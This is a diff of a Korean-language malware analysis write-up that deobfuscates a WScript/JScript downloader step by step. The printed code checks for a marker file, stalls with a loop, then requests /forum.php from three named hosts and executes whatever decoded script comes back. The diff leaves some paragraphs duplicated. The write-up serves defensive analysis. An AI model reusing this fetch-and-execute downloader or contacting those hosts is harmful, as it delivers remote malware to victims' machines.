@@ -41,8 +41,7 @@ function VX30() {FQ96 = kZ37("sp\l\it",ew84,Li29);}function kZ37(iy87,tS71,cl45)
 ##### 1. 분석 과정
 
 	1. 일단 해당 코드에 걸린 난독화를 최대한 보기 쉽게 바꾸고, 이후에 코드 flow를 파악한다.
-
-   	2. Excute되는 Script의 악성 행위를 분석한다.
+	2. Execute되는 Script의 악성 행위를 분석한다.
 
 
 
@@ -124,11 +123,7 @@ fW4라는 함수에 AP9826과 qN252를 넣어 호출한다.
 
 즉 , eval 코드를 난독화한 문자열(AP9826)를 FW4함수를 통해 *deobfuscate 데이터를* ew84에 담는다.
 
-ew84를 **실행**해야 하기 때문에 **ew84를 호출하는 부분**을 찾으면 된다.
 
-
-
-다행히(?) ew84는 바로 다음 라인에서 바로 호출된다.
 
 ```javascript
 function VX30() {
@@ -138,85 +133,130 @@ function VX30() {
 
 아직 ew84를 실행하지 않는 것을 보니, *deobfuscate*가 덜 끝났나보다.
 
-kZ37라는 함수에 의해 정리된 데이터를 다시 FQ96에 담는다.
+즉 , eval 코드를 난독화한 문자열(AP9826)를 FW4함수를 통해 *deobfuscate 데이터를* ew84에 담는다.
 
-이후,
+ew84를 **실행**해야 하기 때문에 **ew84를 호출하는 부분**을 찾으면 된다.
+
+다행히(?) ew84는 바로 다음 라인에서 바로 호출된다.
+
+
+
+```javascript
+function VX30() {
+    FQ96 = kZ37("sp\l\it", **ew84**, Li29);
+}
+```
+
+아직 ew84를 실행하지 않는 것을 보니, *deobfuscate*가 덜 끝났나보다.
+
+실제로 ew84의 데이터를 확인하기 위해 다음과 같은 스크립트를 하단에 추가해서 실행해보았다.
+
+```javascript
+var myMsgBox=new ActiveXObject("wscript.shell")
+myMsgBox.Popup (ew84)
+
+myMsgBox.Popup (Li29)
+```
+
+그러자 다음과 같은 팝업이 떴다.
+
+```javascript
+constructorqyllxnubper='';CQ12 = WScript.CreateObject("Scripting.FileSystemObject");OA92=CQ12["Ge"+"tSpe"+"ci"+"alF"+"olde"+"r"](4-2)+"\\Hv129167.tmp";if (CQ12.FileExists(OA92)) WScript.Quit();CQ12.CreateTextFile(OA92, true).Close();fo32 = 6; while (fo32 < 15092609 ) { Math[""+"s"+""+"q"+""+"r"+""+"t"+""]((fo32)); fo32=fo32+2-1; }FQ96[5-2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);tcgmac=FQ96;
+
+____________________________
+
+qyllx
+```
+
+아직 난독화가 되어있다. FQ96에는 'qyllx'를 구분자로 하여 ew84데이터를 split해간다.
+
+즉 FQ96[0]에는 constructor라는 데이터가 담기고,
+
+FQ96[1]에는 난독화가 된 코드가 담길 것이다.
+
+
 
 ```javascript
 NW87();
 nb5();
 ```
 
-이 두 함수가 실행되고 스크립트는 끝이 난다.
-
-NW87함수에서 다시 FQ96를 *deobfuscate*하고,
-
-이후 FQ96에 파라메타를 보내 Execute Script를 한다.
+이후 이 함수가 실행되고 스크립트는 끝이 난다.
 
 
 
-Execute Script를 곧장 확인 하기 위해서
-
-코드를 실행해 어떠한 Script가 Execute되는지 확인 해 보았다.
-
-해당 스크립트는 다음과 같다.
-
-
+NW함수를 들여다 보자.
 
 ```javascript
-(function anonymous(
-) {
-nubper='';CQ12 = WScript.CreateObject("Scripting.FileSystemObject");OA92=CQ12["Ge"+"tSpe"+"ci"+"alF"+"olde"+"r"](4-2)+"\\Hv129167.tmp";if (CQ12.FileExists(OA92)) WScript.Quit();CQ12.CreateTextFile(OA92, true).Close();fo32 = 6; while (fo32 < 15092609 ) { Math[""+"s"+""+"q"+""+"r"+""+"t"+""]((fo32)); fo32=fo32+2-1; }FQ96[5-2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);tcgmac=FQ96;
-})
+function NW87() {
+    FQ96[xj34] = EO49[FQ96[qN252]];
+}
 ```
 
-해당 코드도 난독화가 되어 있다.
-
-개행마저 안 되어 있기 때문에,  [Online JavaScript Beautifier](https://beautifier.io/)를 통해 코드를 1차 정리 해 주겠다.
-
-
+해당 함수에 
 
 ```javascript
-(function anonymous() {
-    nubper = '';
-    CQ12 = WScript.CreateObject("Scripting.FileSystemObject");
-    OA92 = CQ12["Ge" + "tSpe" + "ci" + "alF" + "olde" + "r"](4 - 2) + "\\Hv129167.tmp";
-    if (CQ12.FileExists(OA92)) WScript.Quit();
-    CQ12.CreateTextFile(OA92, true).Close();
-    fo32 = 6;
-    while (fo32 < 15092609) {
-        Math["" + "s" + "" + "q" + "" + "r" + "" + "t" + ""]((fo32));
-        fo32 = fo32 + 2 - 1;
-    }
-    FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
-    tcgmac = FQ96;
-})
+var myMsgBox=new ActiveXObject("wscript.shell")
+myMsgBox.Popup (EO49[FQ96[qN252]])
+```
+
+를 추가해서 FQ96[xj34]에 무슨데이터가 담기는지 볼 터이다.
+
+그러자
+
+```javascript
+function Function() {
+    [native code]
+}
+```
+
+라는 팝업이 떳다.
+
+FQ96[xj34]를 통해 코드를 실행하는지 알게 되었다.
+
+(참고로 xj34는 3이므로 정확히는 FQ96[3]이 코드를 실행하게 해준다.)
+
+
+
+아까 위에서 난독화된 코드를 좀 정리해보자.
+
+```javascript
+nubper = '';
+CQ12 = WScript.CreateObject("Scripting.FileSystemObject");
+OA92 = CQ12["Ge" + "tSpe" + "ci" + "alF" + "olde" + "r"](4 - 2) + "\\Hv129167.tmp";
+if (CQ12.FileExists(OA92)) WScript.Quit();
+CQ12.CreateTextFile(OA92, true).Close();
+fo32 = 6;
+while (fo32 < 15092609) {
+    Math["" + "s" + "" + "q" + "" + "r" + "" + "t" + ""]((fo32));
+    fo32 = fo32 + 2 - 1;
+}
+FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
+tcgmac = FQ96;
 ```
 
 line 4와 line 9에서 문자 분리 해 놓은것을 제대로 바꿔 보겠다.
 
 ```javascript
-(function anonymous() {
-    nubper = '';
-    CQ12 = WScript.CreateObject("Scripting.FileSystemObject");
-    OA92 = CQ12["GetSpecialFolder"](4 - 2) + "\\Hv129167.tmp";
-    if (CQ12.FileExists(OA92)) WScript.Quit();
-    CQ12.CreateTextFile(OA92, true).Close();
-    fo32 = 6;
-    while (fo32 < 15092609) {
-        Math["sqrt"]((fo32));
-        fo32 = fo32 + 2 - 1;
-    }
-    FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
-    tcgmac = FQ96;
-})
+nubper = '';
+CQ12 = WScript.CreateObject("Scripting.FileSystemObject");
+OA92 = CQ12["GetSpecialFolder"](4 - 2) + "\\Hv129167.tmp";
+if (CQ12.FileExists(OA92)) WScript.Quit();
+CQ12.CreateTextFile(OA92, true).Close();
+fo32 = 6;
+while (fo32 < 15092609) {
+    Math["sqrt"]((fo32));
+    fo32 = fo32 + 2 - 1;
+}
+FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
+tcgmac = FQ96;
 ```
 
 line 4에서 GetSpecialFolder를 통해 로컬 PC의 특정 디렉토리에 접근하는 것을 알 수 있다.
 
 해당 경로에 Hv129167.tmp가 없으면 만들어 준다.
 
-마지막 두줄에서 **FQ96**에 코드를 넘겨 Execute Code하는것을 볼 수 있다.
+마지막 두줄에서 **FQ96[3]**에 난독화된 코드를 넘겨 Execute Code하는것을 볼 수 있다.
 
 ```javascript
     FQ96[5 - 2](fW4('tast.u6s8 r=W=(=  f2i0 0})  ;{e svlaarf  Snyr4u3t e=r  W{r)8e6(.hrcetsapco}n s;e)T(edxnte;s .i6f8 r(W( S;y)4e3s.lianfd e,x4O4fY(y\"+@\"\"=+iynYu4b4g+e\"e@x\"l,t h0h)e)?=\"=+-\'1p)h p{. mWuSrcorfi/p\'t+.]s5l5eDejp[(4282a2Z2+2\')/;/ :}p tetlhs\'e  ,{\' TSEyG4\'3( n=e pSoy.4638.rrWe p{lyarcte (;\")@0\"3++y0Y74,42+(\"]@\"\"r,t\"s\"b)u;s \"v[a)r( gfnSi8r5t S=o tS.y)4(3m.ordenpalra.chet(a/M( \\=d {424}Y)y/ g;,) \'fPuTnTcHtLiMoXnr e(vSrde9S7.)2 L{M XrSeMt\'u(rtnc eSjtbrOientga.efrrCo.mtCphiarrcCSoWd e=( p6a8rrsWe I{n t)(3S d<9 75,51D0j)(+ 3e0l)i;h w} );;0  F=Q 9565[D3j] (;f]S\"8m5o)c(.)o;d -WdSncar-iepbt..wQwuwi\"t,(\")e;d .}j 4}o .ewlwswe\" ,{\" lWpS.cdrcilp-tm.esjlaeneypw(.2t2s2e2t2.)w;w w}\" [j D=5 54+8+a;Z}'))(fo32);
@@ -226,45 +266,40 @@ line 4에서 GetSpecialFolder를 통해 로컬 PC의 특정 디렉토리에 접�
 파라메타로 넘긴 코드는 다음과 같다.
 
 ```javascript
-(function anonymous(
-) {
 Za84 = ["www.test.wynajem-lcd.pl","www.o4j.de","www.be-and-do.com"]; jD55 = 0; while (jD55 < 3) { Wr86 = WScript.CreateObject('MSXML2.ServerXMLHTTP'); yY44 = Math.random().toString()["substr"](2,70+30); try{ Wr86.open('GET', 'http://'+Za84[jD55]+'/forum.php'+"?ehhtlxeegbuni="+yY44, false); Wr86.send(); }catch(e){ return false; } if (Wr86.status === 200) { var Sy43 = Wr86.responseText; if ((Sy43.indexOf("@"+yY44+"@", 0))==-1) { WScript.sleep(22222); } else { Sy43 = Sy43.replace("@"+yY44+"@",""); var fS85 = Sy43.replace(/(\d{2})/g, function (Sd97) { return String.fromCharCode(parseInt(Sd97,10)+30); }); FQ96[3](fS85)(); WScript.Quit(); } } else { WScript.sleep(22222); } jD55++;}
-})
 ```
 
 해당코드 또한  [Online JavaScript Beautifier](https://beautifier.io/)를 통해 코드를 1차 정리 해 주겠다.
 
 ```javascript
-(function anonymous() {
-    Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
-    jD55 = 0;
-    while (jD55 < 3) {
-        Wr86 = WScript.CreateObject('MSXML2.ServerXMLHTTP');
-        yY44 = Math.random().toString()["substr"](2, 70 + 30);
-        try {
-            Wr86.open('GET', 'http://' + Za84[jD55] + '/forum.php' + "?ehhtlxeegbuni=" + yY44, false);
-            Wr86.send();
-        } catch (e) {
-            return false;
-        }
-        if (Wr86.status === 200) {
-            var Sy43 = Wr86.responseText;
-            if ((Sy43.indexOf("@" + yY44 + "@", 0)) == -1) {
-                WScript.sleep(22222);
-            } else {
-                Sy43 = Sy43.replace("@" + yY44 + "@", "");
-                var fS85 = Sy43.replace(/(\d{2})/g, function(Sd97) {
-                    return String.fromCharCode(parseInt(Sd97, 10) + 30);
-                });
-                FQ96[3](fS85)();
-                WScript.Quit();
-            }
-        } else {
-            WScript.sleep(22222);
-        }
-        jD55++;
+Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
+jD55 = 0;
+while (jD55 < 3) {
+    Wr86 = WScript.CreateObject('MSXML2.ServerXMLHTTP');
+    yY44 = Math.random().toString()["substr"](2, 70 + 30);
+    try {
+        Wr86.open('GET', 'http://' + Za84[jD55] + '/forum.php' + "?ehhtlxeegbuni=" + yY44, false);
+        Wr86.send();
+    } catch (e) {
+        return false;
     }
-})
+    if (Wr86.status === 200) {
+        var Sy43 = Wr86.responseText;
+        if ((Sy43.indexOf("@" + yY44 + "@", 0)) == -1) {
+            WScript.sleep(22222);
+        } else {
+            Sy43 = Sy43.replace("@" + yY44 + "@", "");
+            var fS85 = Sy43.replace(/(\d{2})/g, function(Sd97) {
+                return String.fromCharCode(parseInt(Sd97, 10) + 30);
+            });
+            FQ96[3](fS85)();
+            WScript.Quit();
+        }
+    } else {
+        WScript.sleep(22222);
+    }
+    jD55++;
+}
 ```
 
 해당 사이트들에 접속해서 contents(Execute할 Code)를 Parse해 온다.
@@ -275,6 +310,12 @@ WScript.Quit();
 ```
 
 이후 FQ96[3]에 contents를 넘기고 스크립트는 끝이난다.
+
+웹사이트 파싱을통해 새로운 Script를 로드해 실행하는것이다.
+
+
+
+**하지만.....**
 
 ```javascript
 Za84 = ["www.test.wynajem-lcd.pl", "www.o4j.de", "www.be-and-do.com"];
@@ -294,7 +335,7 @@ WScript.Echo(Wr86.responseText);
 
 서버는 열려있으나 이후 추가적으로 실행되는 악성 JS코드는 노출이 되지 않았다.
 
-FQ96를 통해 코드를 실행 하는데, 실행할 코드가 없으므로 더이상 분석이 불가능했다.
+FQ96[3]를 통해 코드를 실행 하는데, 실행할 코드가 없으므로 더이상 분석이 불가능했다.
 
 
 
